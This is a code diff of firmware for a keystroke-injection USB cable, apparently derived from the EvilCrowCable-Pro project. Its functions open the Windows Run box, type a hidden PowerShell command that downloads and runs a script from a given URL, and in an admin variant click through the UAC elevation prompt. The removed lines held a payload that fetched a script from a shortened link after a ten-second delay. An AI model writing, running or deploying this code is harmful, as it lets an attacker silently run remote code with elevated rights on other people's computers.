@@ -1,56 +1,54 @@
-#include "exfil.h"
-#include "phukd.h"
+void winR(){
+    // opens the Run command box
+    Keyboard.press(KEY_LEFT_GUI);
+    Keyboard.press('r');
 
-// based on https://github.com/joelsernamoreno/EvilCrowCable-Pro/tree/main/firmware, edited by @kaliiiiiiiiii
+    Keyboard.releaseAll();
+}
+
+void writeCMD(char *URL){
+    const char* cmd = (String("powershell -w h \"IEX(iwr('")+URL+"'))\"").c_str();
+    Keyboard.print(cmd);
+}
 
 void runRemote(char *URL){
   // downloads and runs a powershell script from a url
-  Keyboard.press(KEY_LEFT_GUI);
-  Keyboard.press('r');
-  delay(100);
-  Keyboard.releaseAll();
-  delay(200);
-  Keyboard.print(F((String("powershell -w h \"IEX(iwr('")+URL+"'))\"").c_str()));
-  delay(100);
-  Keyboard.press(KEY_RETURN);
-  delay(100);
-  Keyboard.press(KEY_RETURN);
-  delay(100);
-  Keyboard.press(KEY_RETURN);
-  delay(100);
-  Keyboard.press(KEY_RETURN);
+  winR();
+  delay(300); // wait for Run command prompt to appear
+  writeCMD(URL);
+
+  for (int i=0; i < 3; i++)
+  {
+    // press enter to run the command
+    // repeats in case the device or OS wasn't ready yet to receive keyboard input
+    delay(100);
+    Keyboard.press(KEY_RETURN);
+    Keyboard.release(KEY_RETURN);
+  }
 };
 
 void runRemoteAdmin(char *URL){
   // same as runRemote, but with admin privileges
   // note: this only works if user logged-in is admin and admin prompts don't require a password
-  Keyboard.press(KEY_LEFT_GUI);
-  Keyboard.press('r');
-  delay(100);
-  Keyboard.releaseAll();
-  delay(200);
-  Keyboard.print(F((String("powershell -w h \"IEX(iwr('")+URL+"'))\"").c_str()));
-  delay(100);
+  winR();
+  delay(300); // wait for Run command prompt to appear
+  writeCMD(URL);
+
+  // run as Admin
   Keyboard.press(129); // ctrl
   Keyboard.press(129); // shift
   Keyboard.press(KEY_RETURN); // enter
   Keyboard.releaseAll();
+  delay(100);
 
-  Keyboard.press(KEY_LEFT_ARROW);
-  delay(100);
-  Keyboard.press(KEY_RETURN);
-  Keyboard.press(KEY_LEFT_ARROW);
-  delay(100);
-  Keyboard.press(KEY_RETURN);
-  Keyboard.press(KEY_LEFT_ARROW);
-  delay(100);
-  Keyboard.press(KEY_RETURN);
-  Keyboard.press(KEY_LEFT_ARROW);
-  delay(100);
-  Keyboard.press(KEY_RETURN);
+  for (int i=0; i < 4; i++)
+  {
+    // select YES on UAC prompt
+    // repeats in case UAC prompt wasn't ready yet to receive keyboard input
+    Keyboard.press(KEY_LEFT_ARROW);
+    delay(20);
+    Keyboard.press(KEY_RETURN);
+    Keyboard.releaseAll();
+    delay(100);
+  }
 };
-
-void payload() {
-  delay(10000); // 10 sec. delay
-  runRemote("is.gd/tuioh");
-}
